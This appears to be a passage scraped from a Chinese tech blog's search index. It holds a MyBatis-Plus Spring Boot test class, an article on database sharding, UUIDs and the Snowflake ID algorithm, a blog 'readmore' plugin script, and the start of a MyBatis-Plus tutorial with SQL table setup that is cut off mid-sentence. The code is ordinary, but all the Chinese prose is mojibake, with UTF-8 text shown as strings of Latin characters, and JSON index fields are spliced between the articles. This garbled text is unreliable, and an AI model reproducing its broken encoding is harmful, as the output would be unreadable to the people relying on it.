123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354@SpringBootTestpublic class MyBatisPlusApplicationTest { @Autowired private IEmployeeService empService; /** * æŸ¥è¯¢æ€»è®°å½•æ•° */ @Test public void count() { Long count = empService.count(); System.out.println("count: " + count); } /** * æ›´æ–°æ•°æ® */ @Test public void update() { Employee employee = new Employee(); employee.setId(1L); employee.setGender("0"); boolean updateResult = empService.updateById(employee); System.out.println("updateResult: " + updateResult); } /** * æ‰¹é‡æ’å…¥ */ @Test public void saveBatch() { List&lt;Employee&gt; list = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; 5; i++) { Employee emp = new Employee(); emp.setAge(26); emp.setGender("1"); emp.setLastName("user-" + i); list.add(emp); } boolean saveResult = this.empService.saveBatch(list); System.out.println("saveResult: " + saveResult); } /** * åˆ é™¤æ•°æ® */ @Test public void delete() { boolean deleteResult = this.empService.removeById(11L); System.out.println("deleteResult: " + deleteResult); }} æ•°æ®åº“æ‰©å±•ä»‹ç»åœ¨ä¼ä¸šå¼€å‘ä¸­ï¼Œå¾€å¾€éœ€è¦é€‰æ‹©åˆé€‚çš„æ–¹æ¡ˆå»åº”å¯¹æ•°æ®è§„æ¨¡çš„å¢é•¿ï¼Œä»¥åº”å¯¹æ•°æ®åº“é€æ¸å¢é•¿çš„è®¿é—®å‹åŠ›å’Œæ•°æ®é‡ã€‚æ•°æ®åº“çš„æ‰©å±•æ–¹å¼ä¸»è¦åŒ…æ‹¬ï¼šä¸šåŠ¡åˆ†åº“ã€ä¸»ä»å¤åˆ¶ã€æ•°æ®åº“åˆ†è¡¨ã€æ•°æ®åº“åˆ†ç‰‡ã€æ•°æ®åº“åˆ†åŒºã€‚ æ•°æ®åº“åˆ†è¡¨å°†ä¸åŒä¸šåŠ¡æ•°æ®åˆ†æ•£å­˜å‚¨åˆ°ä¸åŒçš„æ•°æ®åº“æœåŠ¡å™¨ï¼Œèƒ½å¤Ÿæ”¯æ’‘ç™¾ä¸‡ç”šè‡³åƒä¸‡ç”¨æˆ·è§„æ¨¡çš„ä¸šåŠ¡ï¼Œä½†å¦‚æœä¸šåŠ¡ç»§ç»­å‘å±•ï¼ŒåŒä¸€ä¸šåŠ¡çš„å•è¡¨æ•°æ®ä¹Ÿä¼šè¾¾åˆ°å•å°æ•°æ®åº“æœåŠ¡å™¨çš„å¤„ç†ç“¶é¢ˆã€‚ä¾‹å¦‚ï¼Œæ·˜å®çš„å‡ äº¿ç”¨æˆ·æ•°æ®ï¼Œå¦‚æœå…¨éƒ¨å­˜æ”¾åœ¨ä¸€å°æ•°æ®åº“æœåŠ¡å™¨çš„ä¸€å¼ è¡¨ä¸­ï¼Œè‚¯å®šæ˜¯æ— æ³•æ»¡è¶³æ€§èƒ½è¦æ±‚çš„ï¼Œæ­¤æ—¶å°±éœ€è¦å¯¹å•è¡¨æ•°æ®è¿›è¡Œæ‹†åˆ†ã€‚å•è¡¨æ•°æ®æ‹†åˆ†æœ‰ä¸¤ç§æ–¹å¼ï¼ŒåŒ…æ‹¬å‚ç›´åˆ†è¡¨å’Œæ°´å¹³åˆ†è¡¨ã€‚ç¤ºæ„å›¾å¦‚ä¸‹: å‚ç›´åˆ†è¡¨å‚ç›´åˆ†è¡¨é€‚åˆå°†è¡¨ä¸­æŸäº›ä¸å¸¸ç”¨ä¸”å äº†å¤§é‡ç©ºé—´çš„åˆ—æ‹†åˆ†å‡ºå»ã€‚ä¾‹å¦‚ï¼Œä¸Šé¢ç¤ºæ„å›¾ä¸­çš„ nickname å’Œ description å­—æ®µï¼Œå‡è®¾å¼€å‘ä¸€ä¸ªå©šæ‹ç½‘ç«™ï¼Œç”¨æˆ·åœ¨ç­›é€‰å…¶ä»–ç”¨æˆ·çš„æ—¶å€™ï¼Œä¸»è¦æ˜¯ç”¨ age å’Œ sex ä¸¤ä¸ªå­—æ®µè¿›è¡ŒæŸ¥è¯¢ï¼Œè€Œ nickname å’Œ description ä¸¤ä¸ªå­—æ®µä¸»è¦ç”¨äºå±•ç¤ºï¼Œä¸€èˆ¬ä¸ä¼šåœ¨ä¸šåŠ¡æŸ¥è¯¢ä¸­ç”¨åˆ°ã€‚description å­—æ®µæœ¬èº«åˆæ¯”è¾ƒå å­˜å‚¨ç©ºé—´ï¼Œå› æ­¤å¯ä»¥å°†è¿™ä¸¤ä¸ªå­—æ®µç‹¬ç«‹åˆ°å¦å¤–ä¸€å¼ è¡¨ä¸­ï¼Œè¿™æ ·åœ¨æŸ¥è¯¢ age å’Œ sex æ—¶ï¼Œå°±èƒ½å¸¦æ¥ä¸€å®šçš„æ€§èƒ½æå‡ã€‚ æ°´å¹³åˆ†è¡¨æ°´å¹³åˆ†è¡¨é€‚åˆè¡¨è¡Œæ•°ç‰¹åˆ«å¤§çš„è¡¨ï¼Œæœ‰çš„å…¬å¸è¦æ±‚å•è¡¨è¡Œæ•°è¶…è¿‡ 5000ä¸‡ å°±å¿…é¡»è¿›è¡Œåˆ†è¡¨ï¼Œè¿™ä¸ªæ•°å­—å¯ä»¥ä½œä¸ºå‚è€ƒï¼Œä½†å¹¶ä¸æ˜¯ç»å¯¹æ ‡å‡†ï¼Œå…³é”®è¿˜æ˜¯è¦çœ‹è¡¨çš„è®¿é—®æ€§èƒ½ã€‚å¯¹äºä¸€äº›æ¯”è¾ƒå¤æ‚çš„è¡¨ï¼Œå¯èƒ½è¶…è¿‡ 1000ä¸‡ å°±è¦åˆ†è¡¨äº†ï¼›è€Œå¯¹äºä¸€äº›ç®€å•çš„è¡¨ï¼Œå³ä½¿å­˜å‚¨æ•°æ®è¶…è¿‡ 1äº¿ è¡Œï¼Œä¹Ÿå¯ä»¥ä¸åˆ†è¡¨ã€‚ä½†ä¸ç®¡æ€æ ·ï¼Œå½“çœ‹åˆ°è¡¨çš„æ•°æ®é‡è¾¾åˆ°åƒä¸‡çº§åˆ«æ—¶ï¼Œä½œä¸ºæ¶æ„å¸ˆå°±è¦è­¦è§‰èµ·æ¥ï¼Œå› ä¸ºè¿™å¾ˆå¯èƒ½æ˜¯æ¶æ„çš„æ€§èƒ½ç“¶é¢ˆæˆ–è€…éšæ‚£ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œæ°´å¹³åˆ†è¡¨ç›¸æ¯”å‚ç›´åˆ†è¡¨ï¼Œä¼šå¼•å…¥æ›´å¤šçš„å¤æ‚æ€§ï¼Œä¾‹å¦‚è¦å¤„ç†å…¨å±€å”¯ä¸€çš„æ•°æ® IDï¼ˆåˆ†å¸ƒå¼å”¯ä¸€å…¨å±€ IDï¼‰ã€‚ æç¤º æ›´å¤šå…³äºåˆ†å¸ƒå¼å”¯ä¸€å…¨å±€ ID çš„ç”Ÿæˆæ–¹æ¡ˆå¯ä»¥çœ‹ è¿™é‡Œã€‚ UUIDUUID æŒ‰ç…§ OSF åˆ¶å®šçš„æ ‡å‡†è®¡ç®—ï¼Œç”¨åˆ°äº†ä»¥å¤ªç½‘å¡åœ°å€ã€çº³ç§’çº§æ—¶é—´ã€èŠ¯ç‰‡ ID ç å’Œè®¸å¤šå¯èƒ½çš„æ•°å­—ï¼Œå¹¶ç”±ä»¥ä¸‹å‡ éƒ¨åˆ†çš„ç»„æˆï¼šå½“å‰æ—¥æœŸå’Œæ—¶é—´ã€æ—¶é’Ÿåºåˆ—ã€å…¨å±€å”¯ä¸€çš„ IEEE æœºå™¨è¯†åˆ«å·ã€‚UUID çš„æ ‡å‡†å½¢å¼åŒ…å« 32 ä¸ª 16 è¿›åˆ¶çš„æ•°å­—ï¼Œä»¥è¿å­—å·åˆ†ä¸º 5 æ®µï¼Œå½¢å¼ä¸º cb6ce510-74fe-4e18-ac3d-05a5c96d3a0f çš„ 36 ä¸ªå­—ç¬¦ã€‚ç‰¹åˆ«æ³¨æ„ï¼ŒåŸºäº MAC åœ°å€ç”Ÿæˆ UUID çš„ç®—æ³•å¯èƒ½ä¼šé€ æˆ MAC åœ°å€æ³„éœ²ï¼Œè¿™ä¸ªæ¼æ´æ›¾è¢«ç”¨äºå¯»æ‰¾æ¢…ä¸½èç—…æ¯’çš„åˆ¶ä½œè€…ä½ç½®ã€‚ é€‚ç”¨åœºæ™¯ï¼šåªè¦å¯¹å­˜å‚¨ç©ºé—´æ²¡æœ‰è‹›åˆ»è¦æ±‚çš„éƒ½èƒ½å¤Ÿé€‚ç”¨ï¼Œæ¯”å¦‚å„ç§é“¾è·¯è¿½è¸ªã€æ—¥å¿—å­˜å‚¨ç­‰ã€‚ ä¼˜ç‚¹ï¼šæ€§èƒ½é«˜ï¼Œæœ¬åœ°ç”Ÿæˆï¼Œæ²¡æœ‰ç½‘ç»œæ¶ˆè€—ã€‚å¦‚æœåªè€ƒè™‘å”¯ä¸€æ€§ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨ã€‚ ç¼ºç‚¹ï¼š æ— åºï¼šå³æ— æ³•é¢„æµ‹ ID çš„ç”Ÿæˆé¡ºåºï¼Œä¸èƒ½ç”Ÿæˆé€’å¢çš„æœ‰åºæ•°å­—ã€‚ ID é•¿åº¦è¿‡é•¿ï¼šåˆ†å¸ƒå¼ ID ä¸€èˆ¬éƒ½æ˜¯ä½œä¸ºä¸»é”®ï¼Œä½†æ˜¯ MySQL å®˜æ–¹æ¨èä¸»é”®å°½é‡è¶ŠçŸ­è¶Šå¥½ï¼Œ36 ä¸ªå­—ç¬¦é•¿åº¦çš„ UUID ä¸æ˜¯å¾ˆæ¨èã€‚ å…¥åº“æ€§èƒ½å·®ï¼šæ—¢ç„¶åˆ†å¸ƒå¼ ID æ˜¯ä¸»é”®ï¼Œç„¶åä¸»é”®æ˜¯åŒ…å«ç´¢å¼•çš„ï¼ŒMySQL çš„ç´¢å¼•æ˜¯é€šè¿‡ B+ æ ‘æ¥å®ç°çš„ï¼Œæ¯ä¸€æ¬¡æ–°çš„ UUID æ•°æ®çš„æ’å…¥ï¼Œä¸ºäº†æŸ¥è¯¢çš„ä¼˜åŒ–ï¼Œéƒ½ä¼šå¯¹ç´¢å¼•çš„åº•å±‚ B+ æ ‘è¿›è¡Œä¿®æ”¹ã€‚å› ä¸º UUID æ•°æ®æ˜¯æ— åºçš„ï¼Œæ‰€ä»¥æ¯ä¸€æ¬¡ UUID çš„æ•°æ®æ’å…¥éƒ½ä¼šå¯¹ä¸»é”®åº•å±‚çš„ B+ æ ‘è¿›è¡Œå¾ˆå¤§çš„ä¿®æ”¹ï¼Œè¿™ä¸€ç‚¹éå¸¸ä¸å¥½ã€‚æ’å…¥çš„ ID å®Œå…¨æ— åºï¼Œä¸ä½†ä¼šå¯¼è‡´ä¸€äº›ä¸­é—´èŠ‚ç‚¹äº§ç”Ÿåˆ†è£‚ï¼ˆB+ æ ‘ç´¢å¼•åˆ†è£‚ï¼‰ï¼Œä¹Ÿä¼šç™½ç™½çš„åˆ›é€ å‡ºå¾ˆå¤šçš„ä¸é¥±å’ŒèŠ‚ç‚¹ï¼Œè¿™æ ·å¤§å¤§çš„é™ä½äº†æ•°æ®åº“çš„æ’å…¥æ€§èƒ½ã€‚ ä¸»é”®è‡ªå¢ä»¥æœ€å¸¸è§çš„ç”¨æˆ· ID ä¸ºä¾‹ï¼Œå¯ä»¥æŒ‰ç…§ 1000000 çš„èŒƒå›´å¤§å°è¿›è¡Œåˆ†æ®µï¼Œ1 ~ 999999 æ”¾åˆ°è¡¨ 1 ä¸­ï¼Œ1000000 ~ 1999999 æ”¾åˆ°è¡¨ 2 ä¸­ï¼Œä»¥æ­¤ç±»æ¨ã€‚ å¤æ‚ç‚¹ï¼šåˆ†æ®µå¤§å°çš„é€‰å–ã€‚åˆ†æ®µå¤ªå°ä¼šå¯¼è‡´åˆ‡åˆ†åå­è¡¨æ•°é‡è¿‡å¤šï¼Œå¢åŠ ç»´æŠ¤å¤æ‚åº¦ï¼›åˆ†æ®µå¤ªå¤§å¯èƒ½ä¼šå¯¼è‡´å•è¡¨ä¾ç„¶å­˜åœ¨æ€§èƒ½é—®é¢˜ï¼Œä¸€èˆ¬å»ºè®®åˆ†æ®µå¤§å°åœ¨ 100ä¸‡ è‡³ 2000ä¸‡ ä¹‹é—´ï¼Œå…·ä½“éœ€è¦æ ¹æ®ä¸šåŠ¡éœ€æ±‚é€‰å–åˆé€‚çš„åˆ†æ®µå¤§å°ã€‚ ä¼˜ç‚¹ï¼šå¯ä»¥éšç€æ•°æ®çš„å¢åŠ å¹³æ»‘åœ°æ‰©å……æ–°çš„è¡¨ã€‚ä¾‹å¦‚ï¼Œç°åœ¨çš„ç”¨æˆ·æ˜¯ 100 ä¸‡ï¼Œå¦‚æœå¢åŠ åˆ° 1000 ä¸‡ï¼Œåªéœ€è¦å¢åŠ æ–°çš„è¡¨å°±å¯ä»¥äº†ï¼ŒåŸæœ‰çš„æ•°æ®ä¸éœ€è¦åŠ¨ã€‚ ç¼ºç‚¹ï¼šåˆ†å¸ƒä¸å‡åŒ€ã€‚å‡å¦‚æŒ‰ç…§ 1000 ä¸‡æ¥è¿›è¡Œåˆ†è¡¨ï¼Œæœ‰å¯èƒ½æŸä¸ªåˆ†æ®µå®é™…å­˜å‚¨çš„æ•°æ®é‡åªæœ‰ 1 æ¡ï¼Œè€Œå¦å¤–ä¸€ä¸ªåˆ†æ®µå®é™…å­˜å‚¨çš„æ•°æ®é‡æœ‰ 1000 ä¸‡æ¡ã€‚ å–æ¨¡è¿ç®—åŒæ ·ä»¥ç”¨æˆ· ID ä¸ºä¾‹ï¼Œå‡å¦‚ä¸€å¼€å§‹å°±è§„åˆ’äº† 10 ä¸ªæ•°æ®åº“è¡¨ï¼Œå¯ä»¥ç®€å•åœ°ç”¨ user_id % 10 çš„å€¼æ¥è¡¨ç¤ºæ•°æ®æ‰€å±çš„æ•°æ®åº“è¡¨ç¼–å·ï¼ŒID ä¸º 985 çš„ç”¨æˆ·æ”¾åˆ°ç¼–å·ä¸º 5 çš„å­è¡¨ä¸­ï¼ŒID ä¸º 10086 çš„ç”¨æˆ·æ”¾åˆ°ç¼–å·ä¸º 6 çš„å­è¡¨ä¸­ã€‚ å¤æ‚ç‚¹ï¼šåˆå§‹è¡¨æ•°é‡çš„ç¡®å®šã€‚è¡¨æ•°é‡å¤ªå¤šç»´æŠ¤æ¯”è¾ƒéº»çƒ¦ï¼Œè¡¨æ•°é‡å¤ªå°‘åˆå¯èƒ½å¯¼è‡´å•è¡¨æ€§èƒ½å­˜åœ¨é—®é¢˜ã€‚ ä¼˜ç‚¹ï¼šè¡¨åˆ†å¸ƒæ¯”è¾ƒå‡åŒ€ã€‚ ç¼ºç‚¹ï¼šæ‰©å……æ–°çš„è¡¨å¾ˆéº»çƒ¦ï¼Œæ‰€æœ‰è¡¨çš„æ•°æ®éƒ½è¦é‡æ–°è¿ç§»ã€‚ é›ªèŠ±ç®—æ³•é›ªèŠ±ç®—æ³•ï¼ˆSnowFlakeï¼‰æ˜¯ç”± Twitter å…¬å¸ƒçš„åˆ†å¸ƒå¼ä¸»é”®ç”Ÿæˆç®—æ³•ï¼Œå®ƒèƒ½å¤Ÿä¿è¯ä¸åŒè¡¨çš„ä¸»é”®çš„ä¸é‡å¤æ€§ï¼Œä»¥åŠç›¸åŒè¡¨çš„ä¸»é”®çš„æœ‰åºæ€§ã€‚é›ªèŠ±ç®—æ³•çš„ç‰¹æ€§æ˜¯æœ‰åºã€å…¨å±€å”¯ä¸€ã€é«˜æ€§èƒ½ã€ä½å»¶è¿Ÿï¼ˆå“åº”æ—¶é—´åœ¨ 2ms ä»¥å†…ï¼‰ï¼Œå¯åœ¨åˆ†å¸ƒå¼ç¯å¢ƒï¼ˆå¤šé›†ç¾¤ï¼Œè·¨æœºæˆ¿ï¼‰ä¸‹ä½¿ç”¨ï¼Œå› æ­¤ä½¿ç”¨é›ªèŠ±ç®—æ³•å¾—åˆ°çš„ ID æ˜¯åˆ†æ®µç»„æˆçš„ï¼š ä¸æŒ‡å®šæ—¥æœŸçš„æ—¶é—´å·®ï¼ˆæ¯«ç§’çº§ï¼‰ï¼Œ41 ä½ï¼Œå¤Ÿç”¨ 69 å¹´ é›†ç¾¤ ID + æœºå™¨ IDï¼Œä¸€å…± 10 ä½ï¼ŒåŒ…æ‹¬ 5 ä½ datacenterId å’Œ 5 ä½ workerIdï¼Œæœ€å¤šæ”¯æŒ 1024 å°æœºå™¨ åºåˆ—å·ï¼Œ12 ä½ï¼Œæ¯å°æœºå™¨æ¯æ¯«ç§’å†…æœ€å¤šäº§ç”Ÿ 4096 ä¸ªåºåˆ—å· 1bitï¼šç¬¦å·ä½ï¼Œå›ºå®šæ˜¯ 0ï¼Œè¡¨ç¤ºå…¨éƒ¨ ID éƒ½æ˜¯æ­£æ•´æ•° 41bitï¼šæ—¶é—´æˆ³ï¼ˆæ¯«ç§’æ•°æ—¶é—´å·®ï¼‰ï¼Œä»æŒ‡å®šçš„æ—¥æœŸç®—èµ·ï¼Œå¤Ÿç”¨ 69 å¹´ï¼Œç”¨ Long ç±»å‹è¡¨ç¤ºçš„æ—¶é—´æˆ³æ˜¯ä» 1970-01-01 00:00:00 å¼€å§‹ç®—èµ·çš„ 10bitï¼šæœºå™¨ IDï¼Œæœ‰å¼‚åœ°éƒ¨ç½²ï¼Œå¤šé›†ç¾¤çš„ä¹Ÿå¯ä»¥é…ç½®ï¼Œéœ€è¦çº¿ä¸‹è§„åˆ’å¥½å„åœ°æœºæˆ¿ï¼Œå„é›†ç¾¤ï¼Œå„å®ä¾‹ ID çš„ç¼–å· 12bitï¼šåºåˆ—å·ï¼Œå‰é¢éƒ½ç›¸åŒçš„è¯ï¼Œæœ€å¤šå¯ä»¥æ”¯æŒåˆ° 4096 ä¸ª ä¼˜ç¼ºç‚¹ï¼š é€‚ç”¨åœºæ™¯ï¼šåˆ†å¸ƒå¼åº”ç”¨ç¯å¢ƒçš„æ•°æ®ä¸»é”® ä¼˜ç‚¹ï¼š å¯ä»¥æ ¹æ®è‡ªèº«ä¸šåŠ¡ç‰¹æ€§åˆ†é… bit ä½ï¼Œéå¸¸çµæ´» æ¯«ç§’æ•°åœ¨é«˜ä½ï¼Œè‡ªå¢åºåˆ—åœ¨ä½ä½ï¼Œæ•´ä¸ª ID éƒ½æ˜¯è¶‹åŠ¿é€’å¢çš„ ä¸ä¾èµ–æ•°æ®åº“ç­‰ä¸‰æ–¹ç³»ç»Ÿï¼Œä»¥æœåŠ¡çš„æ–¹å¼éƒ¨ç½²ï¼Œç¨³å®šæ€§æ›´é«˜ï¼Œç”Ÿæˆ ID çš„æ•ˆç‡ä¹Ÿæ˜¯éå¸¸é«˜ï¼Œä½å»¶è¿Ÿ ç¼ºç‚¹ï¼š å¼ºä¾èµ–æœºå™¨æ—¶é’Ÿï¼Œå¦‚æœæœºå™¨çš„æ—¶é’Ÿå›æ‹¨äº†ï¼Œä¼šå¯¼è‡´ç”Ÿæˆé‡å¤çš„ ID è‹¥ç”Ÿæˆç¯å¢ƒä¸­ä½¿ç”¨äº†å®¹å™¨åŒ–æŠ€æœ¯ï¼Œå®ä¾‹çš„ä¸ªæ•°éšæ—¶æœ‰å˜åŒ–ï¼Œé‚£ä¹ˆ SnowFlake ç®—æ³•éœ€è¦ä¸€å®šçš„æ”¹é€ æ‰èƒ½æ›´å¥½åœ°åº”ç”¨åˆ°ç”Ÿäº§ç¯å¢ƒä¸­ åœ¨å•æœºä¸Šæ˜¯é€’å¢çš„ï¼Œä½†æ˜¯ç”±äºæ¶‰åŠåˆ°åˆ†å¸ƒå¼ç¯å¢ƒï¼Œæ¯å°æœºå™¨ä¸Šçš„æ—¶é’Ÿä¸å¯èƒ½å®Œå…¨åŒæ­¥ï¼ˆå¦‚æ—¶é’Ÿå›æ‹¨ï¼‰ï¼Œæœ‰æ—¶å€™å¯èƒ½ä¼šå‡ºç°ä¸æ˜¯å…¨å±€é€’å¢çš„æƒ…å†µï¼ˆæ­¤ç¼ºç‚¹å¯è®¤ä¸ºæ— æ‰€è°“ï¼Œä¸€èˆ¬åˆ†å¸ƒå¼ ID åªæ˜¯è¦æ±‚è¶‹åŠ¿é€’å¢ï¼Œå¹¶ä¸ä¼šä¸¥æ ¼è¦æ±‚é€’å¢ï¼Œ90% çš„ä¸šåŠ¡éœ€æ±‚éƒ½åªéœ€è¦è¶‹åŠ¿é€’å¢ï¼‰ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java æ•°æ®åº“"},{title:"MyBatis-Plus å…¥é—¨æ•™ç¨‹ä¹‹ä¸€",url:"/posts/ed9df8e6.html",text:'å‰è¨€ MyBatis-Plus GitHub ä»“åº“ MyBatis-Plus å®˜æ–¹ Demo ä»£ç  MyBatis-Plus 2.x å®˜æ–¹ä¸­æ–‡æ–‡æ¡£ MyBatis-Plus 3.x å®˜æ–¹ä¸­æ–‡æ–‡æ¡£ MyBatis-Plus ä»‹ç»MyBatis-Plus æ˜¯ä¸€æ¬¾éå¸¸å¼ºå¤§çš„ MyBatis å¢å¼ºå·¥å…·åŒ…ï¼Œåªåšå¢å¼ºä¸åšæ”¹å˜ï¼Œä¸ºç®€åŒ–å¼€å‘ã€æé«˜æ•ˆç‡è€Œç”Ÿã€‚åœ¨ä¸ç”¨ç¼–å†™ä»»ä½• SQL è¯­å¥çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥æå…¶æ–¹ä¾¿åœ°å®ç°å•ä¸€ã€æ‰¹é‡ã€åˆ†é¡µç­‰æ“ä½œã€‚ MyBatis-Plus ç‰¹æ€§ç‰¹è‰²åŠŸèƒ½ï¼š æ— ä¾µå…¥ï¼šåªåšå¢å¼ºä¸åšæ”¹å˜ï¼Œå¼•å…¥å®ƒä¸ä¼šå¯¹ç°æœ‰å·¥ç¨‹äº§ç”Ÿå½±å“ï¼Œå¦‚ä¸èˆ¬é¡ºæ»‘ æŸè€—å°ï¼šå¯åŠ¨å³ä¼šè‡ªåŠ¨æ³¨å…¥åŸºæœ¬ CURDï¼Œæ€§èƒ½åŸºæœ¬æ— æŸè€—ï¼Œç›´æ¥é¢å‘å¯¹è±¡æ“ä½œ å¼ºå¤§çš„ CRUD æ“ä½œï¼šå†…ç½®é€šç”¨ Mapperã€é€šç”¨ Serviceï¼Œä»…ä»…é€šè¿‡å°‘é‡é…ç½®å³å¯å®ç°å•è¡¨å¤§éƒ¨åˆ† CRUD æ“ä½œï¼Œæ›´æœ‰å¼ºå¤§çš„æ¡ä»¶æ„é€ å™¨ï¼Œæ»¡è¶³å„ç±»ä½¿ç”¨éœ€æ±‚ æ”¯æŒ Lambda å½¢å¼è°ƒç”¨ï¼šé€šè¿‡ Lambda è¡¨è¾¾å¼ï¼Œæ–¹ä¾¿çš„ç¼–å†™å„ç±»æŸ¥è¯¢æ¡ä»¶ï¼Œæ— éœ€å†æ‹…å¿ƒå­—æ®µå†™é”™ æ”¯æŒä¸»é”®è‡ªåŠ¨ç”Ÿæˆï¼šæ”¯æŒå¤šè¾¾ 4 ç§ä¸»é”®ç­–ç•¥ï¼ˆå†…ç½®åˆ†å¸ƒå¼å”¯ä¸€ ID ç”Ÿæˆå™¨ - Sequenceï¼‰ï¼Œå¯è‡ªç”±é…ç½®ï¼Œå®Œç¾è§£å†³ä¸»é”®é—®é¢˜ æ”¯æŒ ActiveRecord æ¨¡å¼ï¼šæ”¯æŒ ActiveRecord å½¢å¼è°ƒç”¨ï¼Œå®ä½“ç±»åªéœ€ç»§æ‰¿ Model ç±»å³å¯è¿›è¡Œå¼ºå¤§çš„ CRUD æ“ä½œ æ”¯æŒè‡ªå®šä¹‰å…¨å±€é€šç”¨æ“ä½œï¼šæ”¯æŒå…¨å±€é€šç”¨æ–¹æ³•æ³¨å…¥ï¼ˆ Write once, use anywhere ï¼‰ å†…ç½®ä»£ç ç”Ÿæˆå™¨ï¼šé‡‡ç”¨ä»£ç æˆ–è€… Maven æ’ä»¶å¯å¿«é€Ÿç”Ÿæˆ Mapper ã€ Model ã€ Service ã€ Controller å±‚ä»£ç ï¼Œæ”¯æŒæ¨¡æ¿å¼•æ“ï¼Œæ›´æœ‰è¶…å¤šè‡ªå®šä¹‰é…ç½®ç­‰æ‚¨æ¥ä½¿ç”¨ å†…ç½®åˆ†é¡µæ’ä»¶ï¼šåŸºäº MyBatis ç‰©ç†åˆ†é¡µï¼Œå¼€å‘è€…æ— éœ€å…³å¿ƒå…·ä½“æ“ä½œï¼Œé…ç½®å¥½æ’ä»¶ä¹‹åï¼Œå†™åˆ†é¡µç­‰åŒäºæ™®é€š List æŸ¥è¯¢ åˆ†é¡µæ’ä»¶æ”¯æŒå¤šç§æ•°æ®åº“ï¼šæ”¯æŒ MySQLã€MariaDBã€Oracleã€DB2ã€H2ã€HSQLã€SQLiteã€Postgreã€SQLServer ç­‰å¤šç§æ•°æ®åº“ å†…ç½®æ€§èƒ½åˆ†ææ’ä»¶ï¼šå¯è¾“å‡º SQL è¯­å¥ä»¥åŠå…¶æ‰§è¡Œæ—¶é—´ï¼Œå»ºè®®å¼€å‘æµ‹è¯•æ—¶å¯ç”¨è¯¥åŠŸèƒ½ï¼Œèƒ½å¿«é€Ÿæªå‡ºæ…¢æŸ¥è¯¢ å†…ç½®å…¨å±€æ‹¦æˆªæ’ä»¶ï¼šæä¾›å…¨è¡¨ Delete ã€Update æ“ä½œæ™ºèƒ½åˆ†æé˜»æ–­ï¼Œä¹Ÿå¯è‡ªå®šä¹‰æ‹¦æˆªè§„åˆ™ï¼Œé¢„é˜²è¯¯æ“ä½œ æ”¯æŒæ•°æ®åº“ï¼š MySQLï¼ŒOracleï¼ŒDB2ï¼ŒH2ï¼ŒHSQLï¼ŒSQLiteï¼ŒPostgreSQLï¼ŒSQLServerï¼ŒPhoenixï¼ŒGaussï¼ŒClickHouseï¼ŒSybaseï¼ŒOceanBaseï¼ŒFirebirdï¼ŒCubridï¼ŒGoldilocksï¼Œcsiidb è¾¾æ¢¦æ•°æ®åº“ï¼Œè™šè°·æ•°æ®åº“ï¼Œäººå¤§é‡‘ä»“æ•°æ®åº“ï¼Œå—å¤§é€šç”¨ (ååº“) æ•°æ®åº“ï¼Œå—å¤§é€šç”¨æ•°æ®åº“ï¼Œç¥é€šæ•°æ®åº“ï¼Œç€šé«˜æ•°æ®åº“ MyBatis-Plus æ¶æ„ MyBatis-Plus ç”Ÿæ€ MybatisX - ä¸€æ¬¾å…¨å…è´¹ä¸”å¼ºå¤§çš„ IDEA æ’ä»¶ï¼Œæ”¯æŒè·³è½¬ã€è‡ªåŠ¨è¡¥å…¨ç”Ÿæˆ SQLã€ä»£ç ç”Ÿæˆã€‚ Mybatis-Mate - MyBatis-Plus çš„ä¼ä¸šçº§æ¨¡å—ï¼Œæ”¯æŒåˆ†åº“åˆ†è¡¨ã€æ•°æ®å®¡è®¡ã€å­—æ®µåŠ å¯†ã€æ•°æ®ç»‘å®šã€æ•°æ®æƒé™ã€è¡¨ç»“æ„è‡ªåŠ¨ç”Ÿæˆ SQL ç»´æŠ¤ç­‰é«˜çº§ç‰¹æ€§ã€‚ Dynamic-Datasource - åŸºäº SpringBoot çš„å¤šæ•°æ®æºç»„ä»¶ï¼ŒåŠŸèƒ½å¼ºæ‚ï¼Œæ”¯æŒ Seata åˆ†å¸ƒå¼äº‹åŠ¡ã€‚ Shaun - åŸºäº Pac4J-JWT çš„ WEB å®‰å…¨ç»„ä»¶ï¼Œå¿«é€Ÿé›†æˆã€‚ Lock4j - åŸºäº SpringBoot ä¸”åŒæ—¶æ”¯æŒ RedisTemplateã€Redissionã€Zookeeper çš„åˆ†å¸ƒå¼é”ç»„ä»¶ã€‚ Kaptcha - åŸºäº SpringBoot å’Œ Google Kaptcha çš„ç®€å•éªŒè¯ç ç»„ä»¶ã€‚ MyBatis-Plus å­¦ä¹ è·¯çº¿ Spring å¿«é€Ÿå¯åŠ¨æ¡ˆä¾‹æœ¬èŠ‚æ‰€éœ€çš„æ¡ˆä¾‹ä»£ç ï¼Œå¯ä»¥ç›´æ¥ä» GitHub ä¸‹è½½å¯¹åº”ç« èŠ‚ mybatis-plus-lesson-01ã€‚ è½¯ä»¶ç‰ˆæœ¬è¯´æ˜ åç§° ç‰ˆæœ¬ Druid 1.2.11 Spring 5.3.2 Logback 1.2.3 MyBatis-Plus 3.5.2 åˆå§‹åŒ–æ•°æ®åº“123456789101112CREATE DATABASE `mybatis_plus_lesson` DEFAULT CHARACTER SET utf8mb4;CREATE TABLE `t_employee` ( `id` int(11) NOT NULL AUTO_INCREMENT, `last_name` varchar(255) DEFAULT NULL, `gender` char(1) DEFAULT NULL, `email` varchar(255) DEFAULT NULL, `age` int DEFAULT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8;insert into t_employee(id, last_name, gender, email, age) values(1, \'Jim\',\'1\', \'jim@gmail.com\', 26), (2, \'Peter\',\'1\', \'peter@gmail.com\', 29); å¼•å…¥ Maven ä¾èµ–å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œä¸éœ€è¦å•ç‹¬å¼•å…¥ MyBatis ä¸ MyBatis-Spring 